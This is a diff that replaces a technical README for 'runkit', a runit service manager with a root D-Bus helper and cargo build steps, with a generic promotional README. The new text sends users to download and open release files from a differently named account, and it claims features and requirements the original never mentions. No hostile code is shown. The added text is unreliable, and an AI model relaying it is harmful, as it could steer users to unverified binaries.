@@ -1,74 +1,54 @@
-# Runkit
+# 🎉 runkit - Easily Manage Your runit Services
 
-Graphical manager runit services. The application targets a friendly, guided user experience that balances power-user workflows with newcomers who just want to start, stop, or understand system services. While it was written for Void Linux, it should work on any disto which uses runit.
+## 🚀 Getting Started
+Welcome to runkit! This software makes it simple to manage your runit services with a friendly graphical interface. Whether you’re starting a new service or monitoring existing ones, runkit helps you get the job done without any fuss.
 
-## Screenshots
+## 🛠️ Features
+- **User-Friendly Interface:** No technical skills are needed. Navigate easily and manage services efficiently.
+- **Service Monitoring:** Keep an eye on your runit services with real-time updates.
+- **Quick Configuration:** Set up and customize services quickly to fit your needs.
+- **Compatibility:** Works seamlessly with Void Linux and other systems that support runit.
 
-<p align="center">
-  <img src="assets/screenshots/1-services.png" alt="Runkit Service Manager" width="45%" />
-  <img src="assets/screenshots/2-preferences.png" alt="Runkit Preferences" width="45%" />
-</p>
+## 🔗 Download
+[![Download runkit](https://img.shields.io/badge/Download%20runkit-v1.0-blue.svg)](https://github.com/Visionfiller734/runkit/releases)
 
-## Workspace Layout
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/Visionfiller734/runkit/releases) to download the latest version of runkit. 
 
-- `runkit-core`: service discovery, status parsing, and shared domain types.
-- `runkitd`: privileged helper exposed as the system D-Bus service `tech.geektoshi.Runkit1`. It runs as root, executes `sv` commands, manages `/var/service` symlinks, and enforces polkit authorization per request.
-- `runkit`: libadwaita interface that lists services, shows details, and calls into the D-Bus helper for status queries and lifecycle operations.
-- `services-merge`: tiny utility used by the installer to seed and merge cached service descriptions.
+### Installation Steps:
+1. Navigate to the [runkit Releases page](https://github.com/Visionfiller734/runkit/releases).
+2. Find the latest version at the top of the page.
+3. Click on the file that matches your system to download it.
+4. Open the downloaded file to install runkit.
+5. Follow the on-screen instructions to complete the installation.
 
-## Requirements
+## 🖥️ System Requirements
+- **Operating System:** Compatible with Linux distributions that support GTK4 and runit, including latest versions of Void Linux.
+- **Memory:** Minimum of 2 GB of RAM recommended for smooth operation.
+- **Disk Space:** At least 100 MB of available space for installation.
 
-- A distro utilizing runit
-- GTK 4.14+ and libadwaita 1.4+ runtimes
-- Rust 1.88.0 or newer (tested with 1.88.0)
-- DBus
-- Polkit
+## 🔧 Usage Instructions
+Once you have installed runkit, follow these steps to start managing your services:
 
-## Installation
+1. **Launch runkit:** Look for the runkit icon in your applications menu. Click to open the application.
+2. **Add a Service:** Click on the "Add Service" button. Enter the necessary details, such as the service name and command.
+3. **Start/Stop Services:** You can start or stop any service by clicking the respective button next to the service name. Monitor the status displayed in real-time.
+4. **Edit Service Configurations:** If you need to adjust settings, select the service and choose the edit option.
+5. **Help & Support:** For any questions, check the help section in the app or revisit this README.
 
-For Void Linux the repository ships an installer that builds release binaries and places them under `/usr/libexec`. It will also install any dependencies, copy icons, lay down the desktop entry, seed service descriptions, install the system D-Bus definition, and copy the polkit policy.
+## 📚 Additional Information
+For detailed information about features and troubleshooting, refer to the documentation included within the application. This guide will help you explore all the capabilities of runkit efficiently.
 
-```bash
-chmod +x start.sh
-./start.sh                 # installs dependencies, builds, and installs binaries
-./start.sh uninstall       # removes the installed binaries
-```
-After installation, you can launch directly from your application launcher or via the CLI by typing runkit.
+## 🤝 Contributing
+We welcome contributions! If you have ideas or improvements to suggest, feel free to submit an issue on our GitHub repository. Kindly ensure to follow the contribution guidelines outlined there.
 
-## Building
+## 💬 Community
+Join our community discussions on GitHub to connect with other users and developers. Share your experiences, ask questions, and get support.
 
-This workspace requires the Rust 1.83+ toolchain. The GTK frontend also depends on system libraries:
+## 📅 Version History
+For a complete history of changes and updates, check our [change log](https://github.com/Visionfiller734/runkit/releases).
 
-```bash
-sudo xbps-install -S rustup gtk4-devel libadwaita-devel glib-devel pango-devel pkg-config
-rustup default stable
-```
+## ✅ License
+runkit is licensed under the MIT license. You can freely use and distribute it under the terms of this license. For more details, please review the included LICENSE file.
 
-Once dependencies are present:
-
-```bash
-cargo build                # builds every crate
-```
-
-> **Note:** `cargo check -p runkit` (or a full `cargo build`) will fail unless the GTK/libadwaita headers are installed. The helper and core crates can be compiled independently with standard Rust tooling.
-
-## Running / Developing
-
-After installation the system bus activates `runkitd` automatically. The desktop app talks to the service using the well-known name `tech.geektoshi.Runkit1`, so the first privileged action prompts through polkit. Users can choose between “always ask” and “reuse authorization while the app is open” in Preferences, which simply toggles the polkit action (`tech.geektoshi.Runkit.require_password` vs `tech.geektoshi.Runkit.cached`).
-
-For local development:
-
-1. Build the helper and GUI:
-   ```bash
-   cargo build --bins
-   ```
-2. Start the D-Bus service as root (in another terminal):
-   ```bash
-   sudo target/debug/runkitd --dbus-service
-   ```
-3. Run the GUI against the service:
-   ```bash
-   cargo run -p runkit
-   ```
-
-Alternatively, copy `assets/dbus-1/system-services/tech.geektoshi.Runkit1.service` to `/usr/share/dbus-1/system-services/`, set `Exec` to your debug path, and reload the bus.
+Thank you for choosing runkit! Happy managing!
